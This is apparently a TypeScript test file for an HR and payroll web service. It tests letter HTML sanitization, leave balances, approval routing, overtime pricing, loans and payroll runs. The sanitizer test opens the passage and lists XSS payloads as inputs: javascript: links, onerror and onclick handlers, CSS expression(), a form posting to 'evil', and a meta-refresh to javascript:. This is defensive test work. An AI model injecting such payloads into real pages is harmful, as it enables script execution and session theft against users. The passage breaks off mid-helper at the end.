      ['<a href="javascript:alert(1)">click</a>', 'click'],
      ['<form action=https://evil><input name=p></form>', ''],
      ['<p style="color:red" onclick="x()">red</p>', '<p style="color:red">red</p>'],
      ['<p style="width:expression(alert(1))">e</p>', '<p>e</p>'],
      ['<p style="background:url(&#106;avascript:alert(1))">u</p>', '<p>u</p>'],
      ['<p style="background:\\75rl(x)">u</p>', '<p>u</p>'],
      ['<p title="a>b" onmouseover=alert(1)>t</p>', '<p>t</p>'],
      ['<p x"=y onmouseover=alert(1)>t</p>', '<p>t</p>'],
      ['<!-- <img src=x onerror=alert(1)> -->c', 'c'],
      ['<img src=x onerror=alert(1)', ''],
      ['<td colspan="2" rowspan=x align=center>c</td>', '<td colspan="2" align="center">c</td>'],
      ['1 < 2 > 0', '1 &lt; 2 &gt; 0'],
      ['<meta http-equiv=refresh content="0;url=javascript:alert(1)"><link rel=import href=x>z', 'z'],
    ]
    for (const [dirty, clean] of attacks) expect(sanitizeLetterHtml(dirty), dirty).toBe(clean)
    // What an HR team actually writes survives untouched.
    for (const d of DEFAULT_LETTERS) expect(sanitizeLetterHtml(d.body), d.key).toBe(d.body)
    // …and it is applied when a letter is rendered, whatever was stored.
    expect(renderLetter('<p onclick="x()">Dear {{employee.fullName}}</p><script>x()</script>', { employee: { fullName: 'Ali' } }).html).toBe('<p>Dear Ali</p>')
  })
  it('escapes values and shows unknown placeholders instead of blanking them', () => {
    const r = renderLetter('<p>Dear {{employee.fullName}}, {{employee.nope}}</p>', { employee: { fullName: 'Ali <b>' } })
    expect(r.html).toBe('<p>Dear Ali &lt;b&gt;, [employee.nope]</p>')
    expect(r.missing).toEqual(['employee.nope'])
  })
})

// ─── through the API ────────────────────────────────────────────────────────

let app: FastifyInstance
let tenantId: string
const users: Record<string, { id: string; token: string }> = {}

async function mkUser(key: string, role: string) {
  const u = await prisma.user.create({
    data: { name: key, email: `${key}.hrtest@gsfoods.pk`, password: await bcrypt.hash('x-Password-1', 4), role: role as never, isActive: true, accountStatus: 'active', tenantId },
  })
  await prisma.tenantMember.create({ data: { tenantId, userId: u.id } as never }).catch(() => {})
  users[key] = { id: u.id, token: (issueStaffSession(u) as { accessToken: string }).accessToken }
}

const call = (who: string, method: 'GET' | 'POST' | 'PATCH' | 'PUT' | 'DELETE', url: string, payload?: unknown) =>
  app.inject({ method, url: `/hr${url}`, payload: payload as never, headers: { authorization: `Bearer ${users[who]!.token}` } })

beforeAll(async () => {
  tenantId = (await prisma.tenant.create({ data: { name: 'HR Test Co', slug: 'hr-test-co' } })).id
  await mkUser('ceo', 'admin')
  await mkUser('hr', 'hr')
  await mkUser('boss', 'manager')
  await mkUser('cook', 'kitchen')
  await mkUser('mgmt', 'management')
  app = Fastify()
  app.setErrorHandler((err, _req, reply) => {
    if (err instanceof AppError) return reply.status(err.statusCode).send({ error: { code: err.code, message: err.message } })
    if (err instanceof ZodError) return reply.status(400).send({ error: { code: 'VALIDATION_ERROR', issues: err.issues } })
    return reply.status(500).send({ error: { code: 'INTERNAL', message: (err as Error).message } })
  })
  await app.register(hrRoutes, { prefix: '/hr' })
  await app.ready()
})

afterAll(async () => {
  await prisma.hrPayrollRun.deleteMany({ where: { tenantId } })
  await prisma.hrRecord.deleteMany({ where: { tenantId } })
  await prisma.hrEmployee.deleteMany({ where: { tenantId } })
  await prisma.hrFormDefinition.deleteMany({ where: { tenantId } })
  await prisma.setting.deleteMany({ where: { key: `hr.settings.${tenantId}` } })
  await prisma.auditLog.deleteMany({ where: { tenantId } }).catch(() => {})
  await prisma.tenantMember.deleteMany({ where: { tenantId } }).catch(() => {})
  await prisma.user.deleteMany({ where: { tenantId } })
  await prisma.tenant.deleteMany({ where: { id: tenantId } })
  await app.close()
})

describe('HR through the API', () => {
  let bossEmp: string, cookEmp: string, annual: string

  it('creates employees from the Employee Master format, generating IDs', async () => {
    const b = await call('hr', 'POST', '/employees', { data: { fullName: 'Head Chef', grossSalaryCents: RS(150000), joiningDate: '2025-01-01', employmentType: 'permanent' } })
    expect(b.statusCode).toBe(201)
    expect(b.json().employeeCode).toBe('EMP-0001')
    bossEmp = b.json().id
    await call('hr', 'POST', `/employees/${bossEmp}/link-user`, { userId: users['boss']!.id })
    const c = await call('hr', 'POST', '/employees', { data: { fullName: 'Line Cook', grossSalaryCents: RS(52000), joiningDate: '2025-06-01', managerId: bossEmp, employmentType: 'permanent' } })
    expect(c.json().employeeCode).toBe('EMP-0002')
    cookEmp = c.json().id
    await call('hr', 'POST', `/employees/${cookEmp}/link-user`, { userId: users['cook']!.id })
  })

  it('keeps salaries away from anyone outside HR', async () => {
    expect((await call('cook', 'GET', '/employees')).statusCode).toBe(403)
    expect((await call('boss', 'GET', `/employees/${cookEmp}`)).statusCode).toBe(403)
  })

  it('books leave against the balance and refuses over-booking', async () => {
    annual = (await call('hr', 'POST', '/records/leave_type', { data: { name: 'Annual', entitlementDays: 14, pay: 'paid' } })).json().id
    const ok = await call('cook', 'POST', '/me/records/leave', { data: { leaveType: annual, from: '2026-10-05', to: '2026-10-09' } })
    expect(ok.statusCode).toBe(201)
    expect(ok.json().quantity).toBe(5)
    const tooMuch = await call('cook', 'POST', '/me/records/leave', { data: { leaveType: annual, from: '2026-11-01', to: '2026-11-12' } })
    expect(tooMuch.statusCode).toBe(400)
    expect(tooMuch.json().error.code).toBe('LEAVE_BALANCE') // 14 − 5 pending = 9 < 12
  })

  it('routes approval HOD → HR, and only the right people can act', async () => {
    const leave = (await call('hr', 'GET', `/records/leave?employeeId=${cookEmp}`)).json().records[0]
    expect((await call('cook', 'POST', `/records/leave/${leave.id}/decide`, { decision: 'approved' })).statusCode).toBe(403) // own request
    expect((await call('hr', 'POST', `/records/leave/${leave.id}/decide`, { decision: 'approved' })).statusCode).toBe(403) // HOD step belongs to the boss
    const inbox = (await call('boss', 'GET', '/approvals')).json()
    expect(inbox.map((r: { id: string }) => r.id)).toContain(leave.id)
    expect((await call('boss', 'POST', `/records/leave/${leave.id}/decide`, { decision: 'approved' })).json().status).toBe('submitted')
    expect((await call('hr', 'POST', `/records/leave/${leave.id}/decide`, { decision: 'approved' })).json().status).toBe('approved')
    const me = (await call('cook', 'GET', '/me')).json()
    expect(me.leaveBalances.find((b: { leaveTypeId: string }) => b.leaveTypeId === annual).balance).toBe(9)
  })

  it('holds a future-dated salary revision until its effective date', async () => {
    const rev = (await call('hr', 'POST', '/records/salary_revision', { data: { employee: cookEmp, revisedGross: RS(60000), effectiveDate: '2099-01-01' } })).json()
    expect(rev.data.increaseAmount).toBe(RS(8000))
    // HR raised it, so another HR approver takes the HR step, and management the last.
    expect((await call('ceo', 'POST', `/records/salary_revision/${rev.id}/decide`, { decision: 'approved' })).statusCode).toBe(200)
    expect((await call('mgmt', 'POST', `/records/salary_revision/${rev.id}/decide`, { decision: 'approved' })).json().status).toBe('approved')
    const e = (await call('hr', 'GET', `/employees/${cookEmp}`)).json().employee
    expect(e.grossSalaryCents).toBe(RS(52000)) // not yet
  })

  it('runs a payroll month with OT and a loan, then recovers the loan on lock', async () => {
    await call('hr', 'PUT', '/settings', {
      ...DEFAULT_HR_SETTINGS, eobi: { employeePct: 1, employerPct: 5, base: 'fixed', fixedWageCents: RS(40000) },
    })
    const ot = (await call('cook', 'POST', '/me/records/overtime', { data: { date: '2026-09-10', otHours: 3 } })).json()
    await call('boss', 'POST', `/records/overtime/${ot.id}/decide`, { decision: 'approved' })
    const otDone = (await call('hr', 'POST', `/records/overtime/${ot.id}/decide`, { decision: 'approved' })).json()
    expect(otDone.amountCents).toBe(RS(1500))

    const loan = (await call('hr', 'POST', '/records/loan', { data: { employee: cookEmp, type: 'loan', amount: RS(10000), installments: 3, firstDeduction: '2026-09-01' } })).json()
    await call('ceo', 'POST', `/records/loan/${loan.id}/decide`, { decision: 'approved' })
    expect((await call('mgmt', 'POST', `/records/loan/${loan.id}/decide`, { decision: 'approved' })).json().status).toBe('approved')

    const run = (await call('hr', 'POST', '/payroll/runs', { period: '2026-09' })).json()
    const detail = (await call('hr', 'GET', `/payroll/runs/${run.id}`)).json()
    const slip = detail.payslips.find((p: { employeeId: string }) => p.employeeId === cookEmp)
    const codes = slip.lines.map((l: { code: string }) => l.code)
    expect(codes).toEqual(expect.arrayContaining(['salary', 'overtime', 'eobi_employee', 'loan', 'eobi_employer']))
    expect(slip.netCents).toBe(RS(52000) + RS(1500) - RS(400) - 333333)

    // The preparer cannot approve their own payroll.
    expect((await call('hr', 'POST', `/payroll/runs/${run.id}/approve`)).statusCode).toBe(403)
    expect((await call('ceo', 'POST', `/payroll/runs/${run.id}/approve`)).statusCode).toBe(200)
    expect((await call('ceo', 'POST', `/payroll/runs/${run.id}/lock`)).statusCode).toBe(200)

    const loans = (await call('hr', 'GET', `/employees/${cookEmp}`)).json().loans
    expect(loans[0].recoveredCents).toBe(333333)
    expect(loans[0].outstandingCents).toBe(RS(10000) - 333333)
    // Only a locked payslip shows up in self-service.
    expect((await call('cook', 'GET', '/me')).json().payslips.map((p: { period: string }) => p.period)).toContain('2026-09')
  })

  it('saves the HR team\'s format as a new version and refuses a broken one', async () => {
    const fmt = (await call('hr', 'GET', '/forms/overtime')).json().current
    const renamed = fmt.fields.map((f: { key: string; label: string }) => (f.key === 'otHours' ? { ...f, label: 'Extra hours worked' } : f))
    const saved = await call('hr', 'PUT', '/forms/overtime', { fields: [...renamed, { key: 'supervisor', label: 'Supervisor on duty', type: 'text' }] })
    expect(saved.statusCode).toBe(200)
    expect(saved.json().version).toBe(1)
    const broken = await call('hr', 'PUT', '/forms/overtime', { fields: renamed.filter((f: { key: string }) => f.key !== 'otHours') })
    expect(broken.statusCode).toBe(400)
    expect(broken.json().error.message).toMatch(/quantity/)
  })

  it('refuses to make a format version live that does not exist, leaving the live one live', async () => {
    const before = (await call('hr', 'GET', '/forms/overtime')).json().current
    expect(before.isDefault).toBe(false)
    const missing = await call('hr', 'POST', '/forms/overtime/activate', { version: 77 })
    expect(missing.statusCode).toBe(404)
    const after = (await call('hr', 'GET', '/forms/overtime')).json().current
    expect(after.version).toBe(before.version)
    expect(after.fields.map((f: { key: string }) => f.key)).toContain('supervisor')
    expect((await call('hr', 'POST', '/forms/nope/activate', { version: 1 })).statusCode).toBe(404)
  })

  it('builds every §30 report, as a preview and as CSV, for HR only', async () => {
    const list = (await call('hr', 'GET', '/reports')).json() as Array<{ key: string }>
    expect(list).toHaveLength(25)
    for (const r of list) {
      const q = '?from=2026-01-01&to=2026-12-31&period=2026-09&days=365'
      const preview = await call('hr', 'GET', `/reports/${r.key}${q}`)
      expect(preview.statusCode, r.key).toBe(200)
      expect(Array.isArray(preview.json().header), r.key).toBe(true)
      const file = await call('hr', 'GET', `/reports/${r.key}.csv${q}`)
      expect(file.statusCode, r.key).toBe(200)
      expect(file.headers['content-type']).toMatch(/text\/csv/)
    }
    const eobi = (await call('hr', 'GET', '/reports/eobi?period=2026-09')).json()
    expect(eobi.rows.length).toBeGreaterThan(0)
    const joiners = (await call('hr', 'GET', '/reports/new_joiners?from=2020-01-01&to=2030-12-31')).json()
    expect(joiners.rows.length).toBeGreaterThan(0)
    expect((await call('cook', 'GET', '/reports/salary')).statusCode).toBe(403)
    expect((await call('hr', 'GET', '/reports/nope')).statusCode).toBe(404)
  })

  it('lets an employee withdraw only a request nobody has acted on yet', async () => {
    const fresh = (await call('cook', 'POST', '/me/records/training_request', { data: { need: 'Food safety' } })).json()
    const withdrawn = await call('cook', 'POST', `/records/training_request/${fresh.id}/cancel`)
    expect(withdrawn.statusCode).toBe(200)
    expect(withdrawn.json().status).toBe('cancelled')
    expect((await call('cook', 'POST', `/records/training_request/${fresh.id}/cancel`)).statusCode).toBe(409)

    const halfway = (await call('cook', 'POST', '/me/records/training_request', { data: { need: 'Knife skills' } })).json()
    await call('boss', 'POST', `/records/training_request/${halfway.id}/decide`, { decision: 'approved' })
    const late = await call('cook', 'POST', `/records/training_request/${halfway.id}/cancel`)
    expect(late.statusCode).toBe(409)
    expect(late.json().error.code).toBe('ACTED_ON')

    // Approved leave that has been taken stays taken.
    const leave = (await call('hr', 'GET', `/records/leave?employeeId=${cookEmp}&status=approved`)).json().records[0]
    expect((await call('cook', 'POST', `/records/leave/${leave.id}/cancel`)).statusCode).toBe(409)
    expect((await call('cook', 'GET', '/me')).json().leaveBalances.find((b: { leaveTypeId: string }) => b.leaveTypeId === annual).balance).toBe(9)
  })

  it('will not cancel a loan while an installment of it sits on a payroll, even a draft', async () => {
    const loan = (await call('hr', 'POST', '/records/loan', { data: { employee: cookEmp, type: 'advance', amount: RS(6000), installments: 2, firstDeduction: '2026-10-01' } })).json()
    await call('ceo', 'POST', `/records/loan/${loan.id}/decide`, { decision: 'approved' })
    await call('mgmt', 'POST', `/records/loan/${loan.id}/decide`, { decision: 'approved' })
    const run = (await call('hr', 'POST', '/payroll/runs', { period: '2026-10' })).json()
    const slip = (await call('hr', 'GET', `/payroll/runs/${run.id}`)).json().payslips.find((p: { employeeId: string }) => p.employeeId === cookEmp)
    expect(slip.inputs.loans.map((l: { loanId: string }) => l.loanId)).toContain(loan.id)

    const blocked = await call('hr', 'POST', `/records/loan/${loan.id}/cancel`)
    expect(blocked.statusCode).toBe(409)
    expect(blocked.json().error.code).toBe('ON_PAYROLL')
    // Taken off the payslip, it can go.
    expect((await call('hr', 'PATCH', `/payroll/payslips/${slip.id}`, { loanInstallmentsCents: 0 })).statusCode).toBe(200)
    expect((await call('hr', 'POST', `/records/loan/${loan.id}/cancel`)).json().status).toBe('cancelled')
    expect((await call('hr', 'DELETE', `/payroll/runs/${run.id}`)).statusCode).toBe(204)
  })

  it('an HR-cancelled revision never takes effect', async () => {
    const rev = (await call('hr', 'POST', '/records/salary_revision', { data: { employee: cookEmp, revisedGross: RS(90000), effectiveDate: '2098-06-01' } })).json()
    await call('ceo', 'POST', `/records/salary_revision/${rev.id}/decide`, { decision: 'approved' })
    await call('mgmt', 'POST', `/records/salary_revision/${rev.id}/decide`, { decision: 'approved' })
    expect((await call('hr', 'POST', `/records/salary_revision/${rev.id}/cancel`)).json().status).toBe('cancelled')
    // Its date comes; the 2099 revisions approved earlier are not yet due.
    await applyDueEffects(tenantId, new Date('2098-12-31'))
    const after = await prisma.hrRecord.findUniqueOrThrow({ where: { id: rev.id } })
    expect(after.appliedAt).toBeNull()
    expect((await prisma.hrEmployee.findUniqueOrThrow({ where: { id: cookEmp } })).grossSalaryCents).not.toBe(RS(90000))
  })

  it('keeps requester and approvers apart: nobody approves what they raised, or two steps of one request', async () => {
    // payroll_adjustment has a single HR step — the HR user who raised it cannot clear it.
    const bonus = (await call('hr', 'POST', '/records/payroll_adjustment', { data: { employee: cookEmp, month: '2027-01-01', kind: 'bonus', amount: RS(500000) } })).json()
    const self = await call('hr', 'POST', `/records/payroll_adjustment/${bonus.id}/decide`, { decision: 'approved' })
    expect(self.statusCode).toBe(403)
    expect(self.json().error.message).toMatch(/own request/)
    expect((await call('hr', 'GET', '/approvals')).json().map((r: { id: string }) => r.id)).not.toContain(bonus.id)

    // Management is an HR approver too, but one person signs off one step.
    const rev = (await call('hr', 'POST', '/records/salary_revision', { data: { employee: bossEmp, revisedGross: RS(160000), effectiveDate: '2099-01-01' } })).json()
    expect((await call('mgmt', 'POST', `/records/salary_revision/${rev.id}/decide`, { decision: 'approved' })).json().status).toBe('submitted')
    const twice = await call('mgmt', 'POST', `/records/salary_revision/${rev.id}/decide`, { decision: 'approved' })
    expect(twice.statusCode).toBe(403)
    expect(twice.json().error.message).toMatch(/earlier step/)
    const done = (await call('ceo', 'POST', `/records/salary_revision/${rev.id}/decide`, { decision: 'approved' })).json()
    expect(done.status).toBe('approved')
    expect(done.approvals[1].override).toBeUndefined()

    // A management user who raises a loan clears neither step of it.
    const loan = (await call('mgmt', 'POST', '/records/loan', { data: { employee: bossEmp, type: 'loan', amount: RS(500000), installments: 10, firstDeduction: '2099-01-01' } })).json()
    expect((await call('mgmt', 'POST', `/records/loan/${loan.id}/decide`, { decision: 'approved' })).statusCode).toBe(403)
    await call('hr', 'POST', `/records/loan/${loan.id}/decide`, { decision: 'approved' })
    expect((await call('mgmt', 'POST', `/records/loan/${loan.id}/decide`, { decision: 'approved' })).statusCode).toBe(403)
    // The CEO can still close it, and it is recorded as an override only when it is one.
    const closed = (await call('ceo', 'POST', `/records/loan/${loan.id}/decide`, { decision: 'approved' })).json()
    expect(closed.status).toBe('approved')
    await call('hr', 'POST', `/records/loan/${loan.id}/cancel`)
  })

  it('pays the OT hours the HOD approved, and ignores pay values the employee sends', async () => {
    const form = (await call('cook', 'GET', '/me/forms/overtime')).json()
    const keys = form.fields.map((f: { key: string }) => f.key)
    expect(keys).not.toContain('multiplier')
    expect(keys).not.toContain('approvedHours')

    const ot = (await call('cook', 'POST', '/me/records/overtime', { data: { date: '2026-11-12', otHours: 10, multiplier: 50, approvedHours: 300, otAmount: 5000000 } })).json()
    expect(ot.data.multiplier).toBeNull()
    expect(ot.data).not.toHaveProperty('approvedHours')
    expect(ot.amountCents).toBeNull()

    // Nobody but an approver sets approved hours — not HR through an edit either.
    await call('hr', 'PATCH', `/records/overtime/${ot.id}`, { data: { approvedHours: 300, otAmount: 1 } })
    const edited = (await call('hr', 'GET', `/records/overtime/${ot.id}`)).json().record
    expect(edited.data).not.toHaveProperty('approvedHours')
    expect(edited.amountCents).toBeNull()

    const hod = (await call('boss', 'POST', `/records/overtime/${ot.id}/decide`, { decision: 'approved', approvedHours: 4 })).json()
    expect(hod.status).toBe('submitted')
    expect(hod.data.approvedHours).toBe(4)
    const final = (await call('hr', 'POST', `/records/overtime/${ot.id}/decide`, { decision: 'approved' })).json()
    expect(final.data.approvedHours).toBe(4)
    expect(final.data.multiplier).toBe(2)
    expect(final.amountCents).toBe(overtimeCents(4, RS(52000), DEFAULT_HR_SETTINGS)) // Rs 2,000, not 10 h or 50×
  })

  it('prices OT approved at creation when its format has no steps, and refuses it to self-service', async () => {
    const ot = sectionByKey('overtime')!
    const refused = await call('hr', 'PUT', '/forms/overtime', { fields: ot.fields, workflow: [] })
    expect(refused.statusCode).toBe(400)
    expect(refused.json().error.message).toMatch(/approval step/)

    // A step-less format saved before that rule existed.
    await prisma.hrFormDefinition.updateMany({ where: { tenantId, section: 'overtime' }, data: { isActive: false } })
    await prisma.hrFormDefinition.create({ data: { tenantId, section: 'overtime', version: 90, title: 'Overtime', fields: ot.fields as never, workflow: [] as never, stages: [] as never } })
    try {
      const rec = await call('hr', 'POST', '/records/overtime', { data: { employee: cookEmp, date: '2026-11-20', otHours: 2, otAmount: 5000000 } })
      expect(rec.statusCode).toBe(201)
      expect(rec.json().status).toBe('approved')
      expect(rec.json().amountCents).toBe(overtimeCents(2, RS(52000), DEFAULT_HR_SETTINGS))
      const ess = await call('cook', 'POST', '/me/records/overtime', { data: { date: '2026-11-21', otHours: 1 } })
      expect(ess.statusCode).toBe(422)
      expect(ess.json().error.code).toBe('NO_WORKFLOW')
    } finally {
      await call('hr', 'POST', '/forms/overtime/activate', { version: 0 })
    }
  })

  it('stops HR editing their own master record or moving their own login link', async () => {
    const mine = (await call('ceo', 'POST', '/employees', { data: { fullName: 'HR Officer', grossSalaryCents: RS(80000), employmentType: 'permanent' } })).json()
    expect((await call('ceo', 'POST', `/employees/${mine.id}/link-user`, { userId: users['hr']!.id })).statusCode).toBe(200)

    const raise = await call('hr', 'PATCH', `/employees/${mine.id}`, { data: { grossSalaryCents: RS(800000) } })
    expect(raise.statusCode).toBe(403)
    expect((await prisma.hrEmployee.findUniqueOrThrow({ where: { id: mine.id } })).grossSalaryCents).toBe(RS(80000))
    expect((await call('ceo', 'PATCH', `/employees/${mine.id}`, { data: { phone: '03001234567' } })).statusCode).toBe(200)

    expect((await call('hr', 'POST', `/employees/${mine.id}/link-user`, { userId: null })).statusCode).toBe(403)
    const spare = (await call('hr', 'POST', '/employees', { data: { fullName: 'Spare', employmentType: 'permanent' } })).json()
    expect((await call('hr', 'POST', `/employees/${spare.id}/link-user`, { userId: users['hr']!.id })).statusCode).toBe(403)

    // A login from another company cannot be attached.
    const other = await prisma.tenant.create({ data: { name: 'Other HR Co', slug: `other-hr-co-${Date.now()}` } })
    const outsider = await prisma.user.create({
      data: { name: 'outsider', email: `outsider.${Date.now()}.hrtest@gsfoods.pk`, password: 'x', role: 'kitchen' as never, isActive: true, accountStatus: 'active', tenantId: other.id },
    })
    try {
      expect((await call('hr', 'POST', `/employees/${spare.id}/link-user`, { userId: outsider.id })).statusCode).toBe(404)
      expect((await call('hr', 'POST', `/employees/${spare.id}/link-user`, { userId: users['mgmt']!.id })).statusCode).toBe(200)
    } finally {
      await prisma.user.delete({ where: { id: outsider.id } })
      await prisma.tenant.delete({ where: { id: other.id } })
    }
  })

  it('takes leave days from the dates, not from what the employee types', async () => {
    // 9 days of annual leave left: 20 days typed as half a day is still 20 days.
    const cheap = await call('cook', 'POST', '/me/records/leave', { data: { leaveType: annual, from: '2026-10-12', to: '2026-10-31', days: 0.5 } })
    expect(cheap.statusCode).toBe(400)
    expect(cheap.json().error.code).toBe('LEAVE_BALANCE')
    const short = await call('cook', 'POST', '/me/records/leave', { data: { leaveType: annual, from: '2026-10-12', to: '2026-10-13', days: 1 } })
    expect(short.statusCode).toBe(201)
    expect(short.json().quantity).toBe(2)
    expect(short.json().data.days).toBe(2)
    const half = await call('cook', 'POST', '/me/records/leave', { data: { leaveType: annual, from: '2026-10-15', to: '2026-10-15', days: 0.5 } })
    expect(half.json().quantity).toBe(0.5)
    // An edit that moves the dates is recounted.
    const moved = await call('hr', 'PATCH', `/records/leave/${short.json().id}`, { data: { to: '2026-10-14' } })
    expect(moved.statusCode).toBe(200)
    expect(moved.json().quantity).toBe(3)
    for (const id of [short.json().id, half.json().id]) await call('cook', 'POST', `/records/leave/${id}/cancel`)
  })

  it('refuses leave that overlaps the employee\'s other submitted or approved leave', async () => {
    // 5–9 Oct is approved; a second request for the 8th–12th would charge the 8th and 9th twice.
    const clash = await call('cook', 'POST', '/me/records/leave', { data: { leaveType: annual, from: '2026-10-08', to: '2026-10-12' } })
    expect(clash.statusCode).toBe(409)
    expect(clash.json().error.code).toBe('LEAVE_OVERLAP')
    // A cancelled request does not block its dates.
    const again = await call('cook', 'POST', '/me/records/leave', { data: { leaveType: annual, from: '2026-10-12', to: '2026-10-12' } })
    expect(again.statusCode).toBe(201)
    await call('cook', 'POST', `/records/leave/${again.json().id}/cancel`)
  })

  it('charges leave across the leave-year end to each year for its own days', async () => {
    const casual = (await call('hr', 'POST', '/records/leave_type', { data: { name: 'Casual', entitlementDays: 5, pay: 'paid' } })).json().id
    // 29 Dec – 4 Jan: 3 days in 2026 and 4 in 2027, each within 5 — though 7 in all is not.
    const span = await call('cook', 'POST', '/me/records/leave', { data: { leaveType: casual, from: '2026-12-29', to: '2027-01-04' } })
    expect(span.statusCode).toBe(201)
    expect(span.json().quantity).toBe(7)
    const b26 = (await leaveBalancesFor(tenantId, cookEmp, new Date('2026-06-01'))).find((b) => b.leaveTypeId === casual)!
    const b27 = (await leaveBalancesFor(tenantId, cookEmp, new Date('2027-06-01'))).find((b) => b.leaveTypeId === casual)!
    expect(b26.pending).toBe(3)
    expect(b27.pending).toBe(4)
    // 2027 has 1 day left, so two more January days are refused.
    const more = await call('cook', 'POST', '/me/records/leave', { data: { leaveType: casual, from: '2027-01-11', to: '2027-01-12' } })
    expect(more.statusCode).toBe(400)
    expect(more.json().error.message).toMatch(/Only 1 day/)
    await call('cook', 'POST', `/records/leave/${span.json().id}/cancel`)
  })

  it('checks an edited leave against its new type and year, not crediting it with its old days', async () => {
    const casual2 = (await call('hr', 'POST', '/records/leave_type', { data: { name: 'Casual B', entitlementDays: 5, pay: 'paid' } })).json().id
    const study = (await call('hr', 'POST', '/records/leave_type', { data: { name: 'Study', entitlementDays: 3, pay: 'paid' } })).json().id
    const rec = (await call('cook', 'POST', '/me/records/leave', { data: { leaveType: casual2, from: '2026-11-02', to: '2026-11-03' } })).json()
    expect(rec.status).toBe('submitted')
    const over = await call('hr', 'PATCH', `/records/leave/${rec.id}`, { data: { leaveType: study, to: '2026-11-06' } })
    expect(over.statusCode).toBe(400) // 5 days of Study against 3
    expect(over.json().error.code).toBe('LEAVE_BALANCE')
    const fits = await call('hr', 'PATCH', `/records/leave/${rec.id}`, { data: { leaveType: study, to: '2026-11-04' } })
    expect(fits.statusCode).toBe(200)
    expect(fits.json().quantity).toBe(3)
    await call('cook', 'POST', `/records/leave/${rec.id}/cancel`)
  })

  it('does not let two requests sent at once both spend the same balance', async () => {
    const comp = (await call('hr', 'POST', '/records/leave_type', { data: { name: 'Comp off', entitlementDays: 2, pay: 'paid' } })).json().id
    const [a, b] = await Promise.all([
      call('cook', 'POST', '/me/records/leave', { data: { leaveType: comp, from: '2026-11-16', to: '2026-11-17' } }),
      call('cook', 'POST', '/me/records/leave', { data: { leaveType: comp, from: '2026-11-23', to: '2026-11-24' } }),
    ])
    expect([a.statusCode, b.statusCode].sort()).toEqual([201, 400])
    const bal = (await leaveBalancesFor(tenantId, cookEmp, new Date('2026-11-01'))).find((x) => x.leaveTypeId === comp)!
    expect(bal.pending).toBe(2)
    for (const r of [a, b]) if (r.statusCode === 201) await call('cook', 'POST', `/records/leave/${r.json().id}/cancel`)
  })

  it('carries unused leave into the next year, up to the leave type\'s cap', async () => {
    const earned = (await call('hr', 'POST', '/records/leave_type', { data: { name: 'Earned', entitlementDays: 10, pay: 'paid', carryForward: true, maxCarryForward: 4 } })).json().id
    const flat = (await call('hr', 'POST', '/records/leave_type', { data: { name: 'Flat', entitlementDays: 10, pay: 'paid' } })).json().id
    const leave = (await call('cook', 'POST', '/me/records/leave', { data: { leaveType: earned, from: '2026-12-07', to: '2026-12-09' } })).json()
    await call('boss', 'POST', `/records/leave/${leave.id}/decide`, { decision: 'approved' })
    expect((await call('hr', 'POST', `/records/leave/${leave.id}/decide`, { decision: 'approved' })).json().status).toBe('approved')
    const next = await leaveBalancesFor(tenantId, cookEmp, new Date('2027-03-01'))
    // 7 unused in 2026, capped at 4.
    expect(next.find((b) => b.leaveTypeId === earned)).toMatchObject({ entitlement: 10, carriedForward: 4, balance: 14 })
    expect(next.find((b) => b.leaveTypeId === flat)).toMatchObject({ carriedForward: 0, balance: 10 })
  })

  it('feeds payroll only standing attendance, once a day, net of leave and the late grace', async () => {
    await call('hr', 'PUT', '/settings', {
      ...DEFAULT_HR_SETTINGS, eobi: { employeePct: 1, employerPct: 5, base: 'fixed', fixedWageCents: RS(40000) }, latesPerDeductionDay: 3, lateGraceMinutes: 15,
    })
    const w = (await call('hr', 'POST', '/employees', { data: { fullName: 'Dish Washer', grossSalaryCents: RS(52000), joiningDate: '2025-01-01', employmentType: 'permanent' } })).json().id
    const unpaidType = (await call('hr', 'POST', '/records/leave_type', { data: { name: 'Unpaid', entitlementDays: 0, pay: 'unpaid' } })).json().id
    const att = async (date: string, status: string, lateMinutes?: number) =>
      (await call('hr', 'POST', '/records/attendance', { data: { employee: w, date, status, ...(lateMinutes != null && { lateMinutes }) } })).json()
    // A mistaken absence, cancelled.
    const wrong = await att('2027-02-01', 'absent')
    expect((await call('hr', 'POST', `/records/attendance/${wrong.id}/cancel`)).json().status).toBe('cancelled')
    // Marked absent, then corrected to present: the latest entry stands.
    await att('2027-02-02', 'absent'); await att('2027-02-02', 'present')
    // Entered twice (manual + import): one day.
    await att('2027-02-03', 'absent'); await att('2027-02-03', 'absent')
    // Three lates, all within the 15-minute grace.
    await att('2027-02-04', 'late', 5); await att('2027-02-05', 'late', 7); await att('2027-02-08', 'late', 10)
    // Absent on days of approved leave: a half day unpaid on the 15th, paid annual on the 16th.
    await att('2027-02-15', 'absent'); await att('2027-02-16', 'absent')
    const approve = async (data: Record<string, unknown>) => {
      const l = (await call('ceo', 'POST', '/records/leave', { data: { employee: w, ...data } })).json()
      await call('hr', 'POST', `/records/leave/${l.id}/decide`, { decision: 'approved' })
      expect((await call('mgmt', 'POST', `/records/leave/${l.id}/decide`, { decision: 'approved' })).json().status).toBe('approved')
      return l
    }
    const half = await approve({ leaveType: unpaidType, from: '2027-02-15', to: '2027-02-15', days: 0.5 })
    expect(half.quantity).toBe(0.5)
    await approve({ leaveType: annual, from: '2027-02-16', to: '2027-02-16' })
    // Unpaid leave into March: 26–28 Feb fall in this payroll.
    await approve({ leaveType: unpaidType, from: '2027-02-26', to: '2027-03-02' })

    const run = (await call('hr', 'POST', '/payroll/runs', { period: '2027-02' })).json()
    const slip = (await call('hr', 'GET', `/payroll/runs/${run.id}`)).json().payslips.find((p: { employeeId: string }) => p.employeeId === w)
    expect(slip.inputs).toMatchObject({ absentDays: 1, lateCount: 0, unpaidLeaveDays: 3.5 })
    const daily = RS(52000) / 26
    expect(slip.lines.find((l: { code: string }) => l.code === 'absence').amountCents).toBe(daily)
    expect(slip.lines.find((l: { code: string }) => l.code === 'unpaid_leave').amountCents).toBe(daily * 3.5)
    expect(slip.lines.map((l: { code: string }) => l.code)).not.toContain('late')
    expect((await call('hr', 'DELETE', `/payroll/runs/${run.id}`)).statusCode).toBe(204)
  })

  // ── payroll: loans, OT, preparers, effects, full & final ──────────────────

  const slipOf = async (runId: string, employeeId: string) =>
    (await call('hr', 'GET', `/payroll/runs/${runId}`)).json().payslips.find((p: { employeeId: string }) => p.employeeId === employeeId)
  const newEmployee = async (fullName: string, grossRs: number, extra: Record<string, unknown> = {}) =>
    (await call('hr', 'POST', '/employees', { data: { fullName, grossSalaryCents: RS(grossRs), joiningDate: '2025-01-01', employmentType: 'permanent', ...extra } })).json().id as string
  const approvedLoan = async (employee: string, amountRs: number, installments: number, firstDeduction: string) => {
